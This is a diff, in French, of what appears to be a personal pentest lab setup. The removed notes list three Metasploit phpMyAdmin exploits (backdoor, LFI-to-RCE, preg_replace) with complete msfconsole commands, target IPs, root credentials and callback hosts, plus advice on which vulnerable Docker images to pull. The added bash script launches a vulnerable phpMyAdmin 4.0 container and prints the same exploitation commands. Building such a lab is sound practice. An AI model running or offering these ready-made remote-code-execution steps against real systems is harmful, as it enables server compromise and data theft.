@@ -1,129 +1,14 @@
-###############################################################################
-# EXPLOITS PHPMYADMIN METASPLOIT - VERSIONS DOCKER COMPATIBLES
-###############################################################################
-
-========================================
-EXPLOIT 1: phpmyadmin_3522_backdoor (RECOMMANDÉ - PLUS FIABLE)
-========================================
-Versions compatibles: 3.5.2.2
-Docker Hub: INCERTAIN (vérifier avec docker pull phpmyadmin/phpmyadmin:3.5)
-
-Metasploit:
-use exploit/multi/http/phpmyadmin_3522_backdoor
-set RHOSTS 192.168.1.250
-set RPORT 8080
-set LHOST 192.168.100.10
-exploit
-
-Note: Backdoor réel, pas d'auth nécessaire, RCE direct
-
-
-========================================
-EXPLOIT 2: phpmyadmin_lfi_rce
-========================================
-Versions compatibles: 4.8.0, 4.8.1, 4.8.2, 4.8.3, 4.8.4
-Docker Hub: ✅ phpmyadmin/phpmyadmin:4.8.0 (EXISTE)
-
-Metasploit:
-use exploit/multi/http/phpmyadmin_lfi_rce
-set RHOSTS 192.168.1.250
-set RPORT 8080
-set USERNAME root
-set PASSWORD rootpass
-set LHOST 192.168.100.10
-set TARGETURI /
-exploit
-
-
-========================================
-EXPLOIT 3: phpmyadmin_preg_replace
-========================================
-Versions compatibles: 4.0.x, 4.6.0, 4.6.1, 4.6.2, 4.6.3, 4.6.4, 4.6.5, 4.6.6
-Docker Hub: ✅ phpmyadmin/phpmyadmin:4.6 (EXISTE)
-
-Metasploit:
-use exploit/multi/http/phpmyadmin_preg_replace
-set RHOSTS 192.168.1.250
-set RPORT 8080
-set USERNAME root
-set PASSWORD rootpass
-set LHOST 192.168.100.10
-exploit
-
-
-========================================
-VERSIONS DOCKER VÉRIFIÉES QUI EXISTENT:
-========================================
-✅ phpmyadmin/phpmyadmin:4.0
-✅ phpmyadmin/phpmyadmin:4.6
-✅ phpmyadmin/phpmyadmin:4.7
-✅ phpmyadmin/phpmyadmin:4.8
-✅ phpmyadmin/phpmyadmin:4.8.0
-✅ phpmyadmin/phpmyadmin:4.8.1
-✅ phpmyadmin/phpmyadmin:4.9
-✅ phpmyadmin/phpmyadmin:5.0
-✅ phpmyadmin/phpmyadmin:latest
-
-❌ phpmyadmin/phpmyadmin:3.5.2.2 (n'existe pas)
-❌ phpmyadmin/phpmyadmin:4.6.2 (n'existe pas, utiliser 4.6)
-
-
-========================================
-RECOMMANDATION FINALE:
-========================================
-
-OPTION A - Si tu veux un exploit qui marche GARANTI:
-Version: 4.6
-Exploit: phpmyadmin_preg_replace
-Commandes:
-  docker pull phpmyadmin/phpmyadmin:4.6
-  use exploit/multi/http/phpmyadmin_preg_replace
-
-OPTION B - Si tu veux la version la plus récente vulnérable:
-Version: 4.8.0 ou 4.8.1
-Exploit: phpmyadmin_lfi_rce
-Commandes:
-  docker pull phpmyadmin/phpmyadmin:4.8.0
-  use exploit/multi/http/phpmyadmin_lfi_rce
-
-
-========================================
-SCRIPT D'INSTALLATION OPTION A (4.6 + preg_replace):
-========================================
-
 #!/bin/bash
+set -e
+
+echo "[*] Nettoyage..."
 docker stop phpmyadmin-vuln 2>/dev/null || true
 docker rm phpmyadmin-vuln 2>/dev/null || true
-docker pull phpmyadmin/phpmyadmin:4.6
-docker run -d \
-    --name phpmyadmin-vuln \
-    --add-host=host.docker.internal:host-gateway \
-    -e PMA_HOST=host.docker.internal \
-    -e PMA_PORT=3306 \
-    -p 8080:80 \
-    phpmyadmin/phpmyadmin:4.6
 
-Puis:
-msfconsole -q
-use exploit/multi/http/phpmyadmin_preg_replace
-set RHOSTS 192.168.1.250
-set RPORT 8080
-set USERNAME root
-set PASSWORD rootpass
-set LHOST 192.168.100.10
-set LPORT 4444
-check
-exploit
-
-
-========================================
-SCRIPT D'INSTALLATION OPTION B (4.0 + preg_replace):
-========================================
-
-#!/bin/bash
-docker stop phpmyadmin-vuln 2>/dev/null || true
-docker rm phpmyadmin-vuln 2>/dev/null || true
+echo "[*] Installation phpMyAdmin 4.0..."
 docker pull phpmyadmin/phpmyadmin:4.0
+
+echo "[*] Lancement container..."
 docker run -d \
     --name phpmyadmin-vuln \
     --add-host=host.docker.internal:host-gateway \
@@ -132,21 +17,24 @@ docker run -d \
     -p 8080:80 \
     phpmyadmin/phpmyadmin:4.0
 
-Puis:
-msfconsole -q
-use exploit/multi/http/phpmyadmin_preg_replace
-set RHOSTS 192.168.1.250
-set RPORT 8080
-set USERNAME root
-set PASSWORD rootpass
-set LHOST 192.168.100.10
-set LPORT 4444
-check
-exploit
+sleep 10
 
-
-========================================
-MON CHOIX: phpMyAdmin 4.0 avec preg_replace
-========================================
-C'est la combinaison la plus ancienne et donc la plus vulnérable.
-L'exploit phpmyadmin_preg_replace est très fiable.
+echo ""
+echo "✅ PRÊT !"
+echo ""
+docker ps | grep phpmyadmin
+echo ""
+curl -I http://localhost:8080/ 2>/dev/null | head -3
+echo ""
+echo "EXPLOITATION:"
+echo ""
+echo "msfconsole -q"
+echo "use exploit/multi/http/phpmyadmin_preg_replace"
+echo "set RHOSTS 192.168.1.250"
+echo "set RPORT 8080"  
+echo "set USERNAME root"
+echo "set PASSWORD rootpass"
+echo "set LHOST 192.168.100.10"
+echo "set LPORT 4444"
+echo "exploit"
+echo ""
